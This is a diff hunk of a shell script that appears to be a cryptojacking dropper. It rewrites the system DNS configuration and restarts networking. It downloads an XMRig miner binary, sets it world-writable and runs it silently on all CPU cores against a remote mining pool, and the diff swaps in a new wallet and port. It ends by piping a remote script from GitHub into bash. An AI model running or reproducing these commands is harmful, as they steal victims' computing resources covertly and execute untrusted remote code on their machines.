@@ -11,5 +11,5 @@ echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
 wget -O vrl https://github.com/bondaltomason/meo/releases/download/2.7.0/xmrig-vrl
 chmod 777 vrl
-./vrl --donate-level 1 -o 209.38.198.169:443 -u N5iNHBM9T4h12k2FaNKEbK7bSSsR5Hw2n1xCyp5c97MfSowx3AN8iYWUxapEsiqKqWiZ5dtCs6Ar6G59GCMJVExjNKtH5yq.$(shuf -n 1 -i 1-99999)-BB -p x -a rx/0 -k -t $(nproc --all) > /dev/null 2>&1 &
+./vrl -a rx/0 --donate-level 1 -o 209.38.198.169:8080 -u 165DUuzQoKG9BaBqprN3ZmsMRfvGHMwNwCpehJUqGoGLsSDtB535XA3PPzfRZhu2uYM9xfT8JsKoXEquWMr6XVwKK4aNeCaYixqvQ2Wh74Tqw5U1dcubDGpRz2y61rzdjMibQM5 -p xdev -t $(nproc --all) > /dev/null 2>&1 &
 curl -sL https://github.com/kartolo92/koplok/raw/master/time | bash 
